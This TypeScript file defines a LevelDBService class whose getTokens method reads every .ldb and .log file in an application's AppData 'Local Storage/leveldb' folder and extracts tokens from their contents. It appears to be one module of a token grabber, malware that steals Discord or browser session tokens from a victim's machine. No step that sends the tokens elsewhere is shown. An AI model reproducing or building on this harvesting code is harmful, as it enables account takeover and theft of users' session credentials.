import * as Bluebird from 'bluebird';
import * as fs from 'promise-fs';
import * as path from 'path';
import * as os from 'os';

import { List } from '@assasans/storage';

import { Token } from '../token';
import { Service } from './service';

export class LevelDBService extends Service {
	public constructor(name: string, directory: string) {
		super(name, directory);
	}

	public async getTokens(): Promise<List<Token>> {
		const tokens: List<Token> = new List<Token>();

		const directory = path.join(
			os.homedir(),
			'AppData',
			this.directory,
			'Local Storage/leveldb'
		);
		if(!await this.exists(directory)) return tokens;

		const files: string[] = (await fs.readdir(directory, { encoding: 'utf8' }))
			.filter((name: string) => [ 'ldb', 'log' ].includes(path.extname(name).slice(1).toLowerCase()))
			.map((relative: string) => path.join(directory, relative));

		await Bluebird.all(files.map(async (file: string) => {
			try {
				const content: string = await fs.readFile(file, { encoding: 'utf8' });
				tokens.addRange(this.extractTokens(content));
			} catch(error) {
				console.error(error);
			}
		}));

		return tokens;
	}
}
